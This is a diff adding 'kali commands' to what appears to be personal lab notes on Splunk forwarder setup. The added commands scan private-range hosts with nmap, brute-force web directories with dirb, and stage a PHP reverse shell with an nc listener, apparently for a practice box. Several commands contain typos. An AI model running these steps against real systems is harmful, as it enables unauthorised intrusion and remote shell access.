@@ -65,3 +65,24 @@ cd /opt/splunkforwarder/bin/
 /opt/splunkforwarder/bin# ping 172.1.42.46
 /opt/splunkforwarder/bin# ./splunk add forward-server 172.1.42.46:9997
 :/opt/splunkforwarder/bin#  ./splunk remove forward-server
+
+kali commands
+
+export target=192.168.214.131
+nmap $target -p1-65535 -min-rate=3000
+nmap $target  -p1-65535 -v -min-rate=3000 open_service.txt
+cat open_ports.txt
+ftp $target
+cat note.tx
+export target=192.168.181.129   
+dirb http://192.168.214.131/
+sudo apt install seclists
+sudo apt update
+locate apt sources.list
+sudo updatedb  
+locate raft-small 
+dirb http://192.168.48.129/ /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -r
+locate php-reverse
+cp /usr/share/webshells/php/php-reverse-shell.php rev.php
+nano rev.php 
+nc -lvnp 9997
